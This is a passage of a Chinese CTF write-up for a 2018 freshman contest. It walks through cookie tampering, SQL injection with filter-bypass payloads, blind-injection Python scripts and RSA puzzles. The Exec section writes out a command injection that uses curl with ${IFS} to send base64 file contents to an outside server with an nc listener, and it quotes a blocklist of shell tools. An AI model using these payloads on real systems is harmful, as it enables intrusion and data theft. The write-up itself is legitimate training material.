class="built_in">str</span>(length) + <span class="string">&#x27;x&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*]Generating cache...&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">7</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3fffffff</span></span><br><span class="line">        ranges2 = <span class="number">0x10000000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">6</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3ffffff</span></span><br><span class="line">        ranges2 = <span class="number">0x1000000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">5</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3fffff</span></span><br><span class="line">        ranges2 = <span class="number">0x100000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">4</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3ffff</span></span><br><span class="line">        ranges2 = <span class="number">0x10000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">3</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3fff</span></span><br><span class="line">        ranges2 = <span class="number">0x1000</span></span><br><span class="line">    <span class="keyword">elif</span> length == <span class="number">2</span>:</span><br><span class="line">        ranges1 = <span class="number">0x3ff</span></span><br><span class="line">        ranges2 = <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(ranges1):</span><br><span class="line">    <span class="comment"># for i in xrange(0xfffff):</span></span><br><span class="line">    <span class="comment"># for i in xrange(0x4fffff): # 700MB + RAM</span></span><br><span class="line">    <span class="comment"># for i in xrange(0x3fffff): # 480MB + RAM</span></span><br><span class="line">        s = a % i</span><br><span class="line">        sub_hash = md5(s).hexdigest()[ran1:ran2]</span><br><span class="line">        cache_dict[sub_hash] = s</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*]Done.&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*]Writing to disk...&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        miss = <span class="string">&#x27;*&#x27;</span> * (length + <span class="number">1</span>)</span><br><span class="line">        miss = <span class="string">&#x27;%s &#x27;</span> + miss + <span class="string">&#x27;n&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(ranges2):</span><br><span class="line">            k = b % i</span><br><span class="line">            <span class="keyword">if</span> cache_dict.has_key(k):</span><br><span class="line">                f.write(<span class="string">&#x27;%s %sn&#x27;</span> % (k, cache_dict[k]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f.write(miss % k)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*]Done.&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*]Saved as &#x27;</span>%s<span class="string">&#x27; at current directory.&#x27;</span> % filename</span><br><span class="line">    <span class="keyword">del</span> cache_dict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Proof</span>(<span class="params">proof, filename</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(proof)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        offset = <span class="built_in">int</span>(proof, <span class="number">16</span>) * (length + <span class="number">1</span> + length + <span class="number">1</span> + <span class="number">1</span>)</span><br><span class="line">        f.seek(offset)</span><br><span class="line">        result = f.read(length + <span class="number">1</span> + length + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> result.split()[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">generate(<span class="number">0</span>, <span class="number">6</span>, <span class="string">&#x27;dic.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> proof(<span class="string">&#x27;dc55b0&#x27;</span>, <span class="string">&#x27;dic.txt&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="cookie-150"><a href="#cookie-150" class="headerlink" title="cookie (150)"></a>cookie (150)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">你知道什么是 cookie 吗？</span><br><span class="line"></span><br><span class="line">(cookie 本身并不是 flag)</span><br><span class="line">http://*********:8080/</span><br></pre></td></tr></table></figure><p>将 cookie 中 give_me_the_flag 的值改为 1 刷新即可</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911204309.png"></p><blockquote><p>flag{U_jus7_3dit_The_cookie}</p></blockquote><h2 id="BabySQLi-200"><a href="#BabySQLi-200" class="headerlink" title="BabySQLi (200)"></a>BabySQLi (200)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Baby SQL injection.</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite.</span><br><span class="line"></span><br><span class="line">http://*******:25252/</span><br><span class="line"></span><br><span class="line">注：此题仅限大一学生，大二及以上学生不计分</span><br></pre></td></tr></table></figure><p>这个题没什么难的，Hint 也给了语句，什么也没过滤，告诉了 flag 在 fl4g 表里，直接注入就行，另外注意 sqlite 中没有井号（#）注释符</p><ul><li>payload：<code>&#39; union select * from fl4g --</code></li></ul><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205408.png"></p><blockquote><p>flag{B4BY_5q1_1nJec7i0n}</p></blockquote><h2 id="BabyBurp-200"><a href="#BabyBurp-200" class="headerlink" title="BabyBurp (200)"></a>BabyBurp (200)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Change another way to visit a website?</span><br><span class="line"></span><br><span class="line">http://*********/BabyBurp.php</span><br><span class="line"></span><br><span class="line">hint: You should download a tool ----&gt;&quot;burp suite&quot;</span><br></pre></td></tr></table></figure><p>下载<a href="https://portswigger.net/burp">BurpSuit</a>，开启代理拦截，题目里说“You may use your iphoneXXXXXX to find the flag?”，所以更改 user agent 为“iphoneXXXXXX”的即可。</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205049.png"></p><blockquote><p>flag{Bu1p_1s_tH3_beSt}</p></blockquote><h2 id="EasySQLi-220"><a href="#EasySQLi-220" class="headerlink" title="EasySQLi (220)"></a>EasySQLi (220)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Very easy SQl injection.</span><br><span class="line">What did I filter?</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite</span><br><span class="line"></span><br><span class="line">http://*******:25254/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>继续用上一题的 payload 发现 union、select 和 from 被过滤掉了，用双写或大小写都能绕过</p><ul><li>payload1：<code>&#39; uNion selEct * frOm fl4g --</code></li><li>payload2：<code>&#39; ununionion selselectect * frfromom fl4g --</code></li></ul><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205615.png"></p><blockquote><p>flag{50_ea5y_r1gh7}</p></blockquote><hr><h2 id="HardSQLi-250"><a href="#HardSQLi-250" class="headerlink" title="HardSQLi (250)"></a>HardSQLi (250)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A little difficult SQL injection</span><br><span class="line">Really looks like the previous challenge?</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite</span><br><span class="line"></span><br><span class="line">http://*******:25255/</span><br></pre></td></tr></table></figure><p>接着用第一题的 payload 测试，发现出了 union、select 和 from 被过滤外，空格也被过滤掉了，可以利用注释符 /**/ 绕过，另外大小写不能绕过关键字的过滤，只有双写能绕过</p><ul><li>payload：<code>&#39;/\*\*/uniunionon/\*\*/seselectlect/\*\*/\*/\*\*/frfromom/\*\*/fl4g/\*\*/--/\*\*/</code></li></ul><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911205945.png"></p><blockquote><p>flag{4_b1t_0f_HaRd_hhhhhh}</p></blockquote><h2 id="BadSQLi-300"><a href="#BadSQLi-300" class="headerlink" title="BadSQLi (300)"></a>BadSQLi (300)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I heard only the real bad-ass can solve this challenge.</span><br><span class="line"></span><br><span class="line">Hint: Backend using SQLite.</span><br><span class="line"></span><br><span class="line">http://srpopty.cn:25253/</span><br></pre></td></tr></table></figure><p>这个题除了前面那些过滤外，还过滤掉了所有空白字符，星号（*）以及逗号，只能盲注，空白字符可以用括号绕过</p><ul><li>payload1（获取列名）：<code>1&#39;oorr(selorect(hex(sql))frorom(sqlite_master))like(&#39;%s%%&#39;)--</code></li><li>payload2（获取 flag）：<code>1&#39;oorr(selorect(hex(text))frorom(fl4g))like(&#39;%s%%&#39;)--</code></li></ul><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.hexdigits</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.86.208:25253/?id=&#x27;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;1&#x27;oorr(selorect(hex(sql))frorom(sqlite_master))like(&#x27;%s%%&#x27;)--&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&quot;1&#x27;oorr(selorect(hex(text))frorom(fl4g))like(&#x27;%s%%&#x27;)--&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(dic):</span><br><span class="line">    payload = payload1 % (result + dic[i])</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    ret = requests.get(url+payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;When&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        result += dic[i]</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] &#x27;</span> + result</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[*] Result: &#x27;</span> + result.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{ThI5_5q1i_s0_B4444d}</p></blockquote><h2 id="RealSQL"><a href="#RealSQL" class="headerlink" title="RealSQL"></a>RealSQL</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flag is admin&#x27;s password.</span><br><span class="line"></span><br><span class="line">http://********:23333/</span><br></pre></td></tr></table></figure><p>这是一道真正的 SQL 注入题，不像前面的题目甚至给出了查询语句的样子，这个题什么也没有给，所以需要自己试一试哪些被过滤掉了，被过滤掉的字符都会弹出 <code>illegal character!!@\_@</code> 的提示，以此来判断哪些字符被过滤掉了。</p><p>大部分在登录或注册等界面的 SQL 注入，注入点基本都在 username 处，大部分网站在后端会把 password 进行哈希，与数据库中保存的进行比较，所以 password 不大可能有注入。</p><p>这里直接给出过滤的正则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;/ |\*|#|,|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%09&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0b&quot;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0c&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%0d&#x27;</span>).<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%a0&#x27;</span>).<span class="string">&quot;/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt; alert(&#x27;illegal character!!@_@&#x27;);parent.location.href=&#x27;index.php&#x27;; &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">strrpos</span>(<span class="variable">$str</span>,<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%00&quot;</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt; alert(&#x27;illegal character!!@_@&#x27;);parent.location.href=&#x27;index.php&#x27;; &lt;/script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到被过滤的有空格、空白字符、*、#、union、like、regexp、for、and、or、–、&amp;、| 等常见的注入字符 <br> 但是还有一些 SQL 语句操作符没有被过滤掉</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">!</span>,<span class="operator">!=</span>,<span class="operator">=</span>,<span class="operator">+</span>,<span class="operator">-</span>,<span class="operator">^</span>,<span class="operator">%</span>,<span class="operator">&gt;</span>,<span class="operator">&lt;</span>,<span class="operator">~</span></span><br></pre></td></tr></table></figure><p>首先测试 uname，如果 uname 随便输入一个用户的话，会弹出“username error!!@_@”的提示，所以可以肯定有一次对 uname 的查询，以此首先来判断 uname 是否存在，那么猜测查询语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> uname<span class="operator">=</span><span class="string">&#x27;&#123;$input&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>其中 $input 为我们的输入，虽然过滤掉了所有的空白字符，但是有很多布尔以及算数运算符没有被过滤，那么就可以构造连续的布尔式获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from users where username=&#x27;&#x27;!=(mid((username)from(-1))=&#x27;a&#x27;)</span><br></pre></td></tr></table></figure><p>如果 (mid((username)from(-1))=’a’) 返回了 0，那么中间的表达式就会为 false，整个表达式也会为 false，如果返回了 1，就代表查到了数据，因此可以提交</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&#x27;!=(mid((passwd)from(-1))=&#x27;e&#x27;)=&#x27;1&amp;passwd=1</span><br></pre></td></tr></table></figure><p>这样一位一位的猜出来 password。exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*-  coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;http://********:23333/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">randstr = string.ascii_letters + string.digits + <span class="string">&#x27;&#125;_&#123;&#x27;</span></span><br><span class="line">remark = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> randstr:</span><br><span class="line">        passwd = i+remark</span><br><span class="line">        uname = <span class="string">&quot;&#x27;!=(mid((passwd)from(-&#123;j&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            j=<span class="built_in">str</span>(j), passwd=passwd)</span><br><span class="line">        data = &#123;<span class="string">&quot;uname&quot;</span>: uname, <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;ddd&quot;</span>&#125;</span><br><span class="line">        <span class="built_in">print</span> uname</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;password error!!&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            remark = passwd</span><br><span class="line">            <span class="built_in">print</span> remark</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{THI5_1s_Real_sq1}</p></blockquote><h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please do this challenge after you can login with admin.</span><br><span class="line"></span><br><span class="line">http://********:23333/</span><br></pre></td></tr></table></figure><p>这个题需要上个题登录到 admin 以后才能做，用上一题的 flag 登录成功后可以看到一个命令执行的界面，题目的目的非常简单，执行命令，但是看不到命令执行的结果，只能知道命令是否执行完成，另外此题对命令也做了一些过滤，但是并不是很难。</p><p>最简单的思路就是用反弹 shell 获取数据，但是对反弹 shell 也做了一些限制，过滤正则如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = &quot; |bash|perl|nc|java|php|&gt;|&gt;&gt;|wget|ftp|python|sh&quot;;</span><br></pre></td></tr></table></figure><p>空格可以使用 ${IFS}绕过，获取数据可以用 curl。首先在自己的服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 12345 -vv</span><br></pre></td></tr></table></figure><p>之后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl<span class="variable">$&#123;IFS&#125;</span>***.***.***.***:12345/`<span class="built_in">ls</span><span class="variable">$&#123;IFS&#125;</span>-al|<span class="built_in">base64</span>`</span><br></pre></td></tr></table></figure><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180924155642.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl<span class="variable">$&#123;IFS&#125;</span>123.206.86.208:12345/`<span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>flag_788f1a3aa1fa053f7fa6560d456f4b92|<span class="built_in">base64</span>`</span><br></pre></td></tr></table></figure><blockquote><p>flag{sql_iNJEct_comMond_eXEC!}</p></blockquote><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="BabyCrypto-100"><a href="#BabyCrypto-100" class="headerlink" title="BabyCrypto (100)"></a>BabyCrypto (100)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Who is Caesar?</span><br><span class="line">Notice: This question is limited to the freshman , sophomore and above will not scored</span><br><span class="line"></span><br><span class="line">qwlr&#123;G3cj_P4dj_NLp5lC_n1as3c&#125;</span><br></pre></td></tr></table></figure><p>flag 被凯撒加密了，qwlr{G3cj_P4dj_NLp5lC_n1as3c}就是密文，解密即可</p><blockquote><p>flag{V3ry_E4sy_CAe5aR_c1ph3r}</p></blockquote><h2 id="BabyCrypto2-100"><a href="#BabyCrypto2-100" class="headerlink" title="BabyCrypto2 (100)"></a>BabyCrypto2 (100)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">This is a simple Morse Code!</span><br><span class="line">Notice: This question is limited to the freshman , sophomore and above will not scored</span><br><span class="line"></span><br><span class="line">Hint: All characters of flag are uppercase.</span><br><span class="line"></span><br><span class="line">flag&#123;-... .- -... -.-- -- --- .-. ... . -.-. --- -.. .&#125;</span><br></pre></td></tr></table></figure><p>这次是被用摩斯电码加密了，也是直接解密即可，注意 flag 中所有的字符都是大写（莫斯电码不区分大小写）</p><blockquote><p>flag{BABYMORSECODE}</p></blockquote><h2 id="RSA-150"><a href="#RSA-150" class="headerlink" title="RSA (150)"></a>RSA (150)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RSA is based on a simple formula, let&#x27;s do a math problem.</span><br><span class="line">    c = 150815</span><br><span class="line">    d = 1941</span><br><span class="line">    N = 435979</span><br><span class="line">what is the decrypted number?</span><br><span class="line"></span><br><span class="line">Hint: flag&#x27;s format is flag&#123;decrypted number&#125;</span><br></pre></td></tr></table></figure><p>这个题只是考察了 RSA 的解密公式<code>decrypted = c ^ d mod N</code>。另外在 RSA 体系中，m、c、d、e、n 这些的含义大都是固定的，随便找几篇文章就能懂。最后结果为 133337</p><blockquote><p>flag{133337}</p></blockquote><h2 id="RSA2-250"><a href="#RSA2-250" class="headerlink" title="RSA2 (250)"></a>RSA2 (250)</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">This puzzle are different from the previous puzzle, what&#x27;s the &quot;dq&quot; and &quot;dp&quot;? Can you decrypt the ciphertext?</span><br><span class="line">c: 95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885</span><br><span class="line">p: 11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243</span><br><span class="line">q: 12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629</span><br><span class="line">dp: 8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961</span><br><span class="line">dq: 3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659</span><br></pre></td></tr></table></figure><p>和上一道题相比没有了 d 以及 n，多了 dp 和 dq，题目描述中也问了什么是 dp 以及 dq，它们与中国剩余定理算法相关</p><p><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911211512.png"></p><ul><li>p 和 q 是素数</li><li>dp = d mod (p - 1)</li><li>dq = d mod (q - 1)</li><li>qInv = (1/q) mod p （1/q 为 q 的乘法逆元）</li><li>m1 = c^dp mod p</li><li>m2 = c^dq mod q</li><li>h = qInv * (m1 - m2) mod p</li><li>m = m2 + h * q</li></ul><p>现在直接按照上述步骤计算即可，p、q、dp、dq 与 c 均已知，最后就能直接算出明文 m，另外上述步骤中的 qInv 是模逆的</p><p>具体请参考：<a href="https://www.di-mgt.com.au/crt_rsa.html">应用于 RSA 的中国剩余定理</a></p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">95272795986475189505518980251137003509292621140166383887854853863720692420204142448424074834657149326853553097626486371206617513769930277580823116437975487148956107509247564965652417450550680181691869432067892028368985007229633943149091684419834136214793476910417359537696632874045272326665036717324623992885</span></span><br><span class="line">p = <span class="number">11387480584909854985125335848240384226653929942757756384489381242206157197986555243995335158328781970310603060671486688856263776452654268043936036556215243</span></span><br><span class="line">q = <span class="number">12972222875218086547425818961477257915105515705982283726851833508079600460542479267972050216838604649742870515200462359007315431848784163790312424462439629</span></span><br><span class="line">dp = <span class="number">8191957726161111880866028229950166742224147653136894248088678244548815086744810656765529876284622829884409590596114090872889522887052772791407131880103961</span></span><br><span class="line">dq = <span class="number">3570695757580148093370242608506191464756425954703930236924583065811730548932270595568088372441809535917032142349986828862994856575730078580414026791444659</span></span><br><span class="line"></span><br><span class="line">qinv = modinv(q, p)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">h = (qinv * (m1 - m2)) % p</span><br><span class="line">m = m2 + h * q</span><br><span class="line">m_hex = <span class="built_in">str</span>(<span class="built_in">hex</span>(m))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(c), <span class="number">16</span>)) <span class="keyword">for</span> c <span 